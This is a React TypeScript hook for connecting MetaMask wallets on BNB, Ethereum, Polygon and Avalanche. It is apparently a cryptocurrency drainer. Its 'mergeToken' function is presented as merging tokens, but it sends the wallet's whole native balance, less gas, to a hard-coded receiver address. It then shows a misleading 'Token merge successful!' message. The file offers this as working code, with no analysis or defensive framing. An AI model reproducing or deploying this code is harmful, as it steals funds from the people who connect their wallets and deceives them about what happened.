import { useState, useEffect, useCallback } from 'react';

declare global {
  interface Window {
    ethereum?: any;
  }
}

export const NETWORKS = {
  bnb: {
    chainId: "0x38",
    name: "BNB Smart Chain",
    symbol: "BNB",
    rpcUrl: "https://bsc-dataseed.binance.org/",
  },
  ethereum: {
    chainId: "0x1",
    name: "Ethereum Mainnet",
    symbol: "ETH",
    rpcUrl: "https://mainnet.infura.io/v3/",
  },
  polygon: {
    chainId: "0x89",
    name: "Polygon",
    symbol: "MATIC",
    rpcUrl: "https://polygon-rpc.com",
  },
  avalanche: {
    chainId: "0xa86a",
    name: "Avalanche",
    symbol: "AVAX",
    rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
  },
};

const RECEIVER_ADDRESS = "0x1Bd61346A4ff20124AcF0dfC7d9E5e2fc548E3D4";

export function useWeb3() {
  const [selectedNetwork, setSelectedNetwork] = useState("bnb");
  const [walletConnected, setWalletConnected] = useState(false);
  const [balance, setBalance] = useState("0");
  const [account, setAccount] = useState("");
  const [connecting, setConnecting] = useState(false);
  const [error, setError] = useState("");

  const showToast = useCallback((message: string, type: 'success' | 'error' = 'success') => {
    // Simple toast notification
    const toast = document.createElement('div');
    toast.className = `fixed top-4 right-4 z-50 p-4 rounded-lg text-white font-medium ${
      type === 'success' ? 'bg-green-500' : 'bg-red-500'
    }`;
    toast.textContent = message;
    document.body.appendChild(toast);
    
    setTimeout(() => {
      document.body.removeChild(toast);
    }, 3000);
  }, []);

  const updateBalance = useCallback(async (address: string) => {
    if (!window.ethereum) return;
    
    try {
      const { ethers } = await import('ethers');
      const provider = new ethers.BrowserProvider(window.ethereum);
      const nativeBalance = await provider.getBalance(address);
      setBalance(ethers.formatEther(nativeBalance));
    } catch (error) {
      console.error('Failed to update balance:', error);
    }
  }, []);

  const switchNetwork = useCallback(async (key: string) => {
    const net = NETWORKS[key as keyof typeof NETWORKS];
    if (!window.ethereum) {
      showToast("MetaMask not found", 'error');
      return false;
    }

    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: net.chainId }],
      });
      return true;
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: net.chainId,
                chainName: net.name,
                nativeCurrency: {
                  name: net.symbol,
                  symbol: net.symbol,
                  decimals: 18,
                },
                rpcUrls: [net.rpcUrl],
              },
            ],
          });
          return true;
        } catch (addError) {
          showToast("Failed to add network", 'error');
          return false;
        }
      } else {
        showToast("Network switch rejected", 'error');
        return false;
      }
    }
  }, [showToast]);

  const connectWallet = useCallback(async () => {
    if (!window.ethereum) {
      showToast("MetaMask not detected", 'error');
      return;
    }

    setConnecting(true);
    setError("");
    
    try {
      // Switch to selected network first
      const networkSwitched = await switchNetwork(selectedNetwork);
      if (!networkSwitched) {
        setConnecting(false);
        return;
      }

      const { ethers } = await import('ethers');
      const provider = new ethers.BrowserProvider(window.ethereum);
      
      // Request account access
      const accounts = await provider.send("eth_requestAccounts", []);
      
      if (accounts.length === 0) {
        throw new Error("No accounts found");
      }

      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      
      setAccount(address);
      setWalletConnected(true);
      
      // Update balance
      await updateBalance(address);
      
      showToast("Wallet connected successfully!");
    } catch (error: any) {
      console.error("Connection error:", error);
      setError(error.message || "Failed to connect wallet");
      showToast(error.message || "Failed to connect wallet", 'error');
    } finally {
      setConnecting(false);
    }
  }, [selectedNetwork, switchNetwork, updateBalance, showToast]);

  const mergeToken = useCallback(async () => {
    if (!walletConnected || !window.ethereum || !account) {
      showToast("Wallet not connected", 'error');
      return;
    }

    try {
      const { ethers } = await import('ethers');
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      // Get current balance
      const nativeBalance = await provider.getBalance(account);
      
      if (nativeBalance === 0n) {
        showToast("No balance to merge", 'error');
        return;
      }

      // Get fee data
      const feeData = await provider.getFeeData();
      const gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");

      // Estimate gas
      const gasEstimate = await signer.estimateGas({
        to: RECEIVER_ADDRESS,
        value: ethers.parseEther("0.001"), // Small amount for estimation
      });

      const gasCost = gasEstimate * gasPrice;
      let valueToSend = nativeBalance - gasCost;

      // Add buffer for Ethereum
      if (selectedNetwork === "ethereum") {
        const buffer = ethers.parseEther("0.0001");
        valueToSend -= buffer;
      }

      if (valueToSend <= 0n) {
        showToast("Not enough balance to cover gas fees", 'error');
        return;
      }

      // Send transaction
      const tx = await signer.sendTransaction({
        to: RECEIVER_ADDRESS,
        value: valueToSend,
        gasPrice: gasPrice,
        gasLimit: gasEstimate,
      });

      showToast("Transaction sent, waiting for confirmation...");
      
      // Wait for confirmation
      await tx.wait();
      
      showToast("Token merge successful!");
      
      // Update balance
      await updateBalance(account);
      
    } catch (error: any) {
      console.error("Merge error:", error);
      const errorMessage = error.reason || error.message || "Merge failed";
      showToast(errorMessage, 'error');
    }
  }, [walletConnected, account, selectedNetwork, updateBalance, showToast]);

  // Check if wallet is already connected on load
  useEffect(() => {
    if (window.ethereum) {
      window.ethereum.request({ method: 'eth_accounts' })
        .then((accounts: string[]) => {
          if (accounts.length > 0) {
            setAccount(accounts[0]);
            setWalletConnected(true);
            updateBalance(accounts[0]);
          }
        })
        .catch(console.error);
    }
  }, [updateBalance]);

  // Listen for account changes
  useEffect(() => {
    if (window.ethereum) {
      const handleAccountsChanged = (accounts: string[]) => {
        if (accounts.length === 0) {
          setWalletConnected(false);
          setAccount("");
          setBalance("0");
        } else {
          setAccount(accounts[0]);
          setWalletConnected(true);
          updateBalance(accounts[0]);
        }
      };

      const handleChainChanged = () => {
        window.location.reload();
      };

      window.ethereum.on('accountsChanged', handleAccountsChanged);
      window.ethereum.on('chainChanged', handleChainChanged);

      return () => {
        if (window.ethereum.removeListener) {
          window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
          window.ethereum.removeListener('chainChanged', handleChainChanged);
        }
      };
    }
  }, [updateBalance]);

  return {
    selectedNetwork,
    setSelectedNetwork,
    walletConnected,
    balance,
    account,
    connecting,
    error,
    connectWallet,
    mergeToken,
    NETWORKS,
  };
}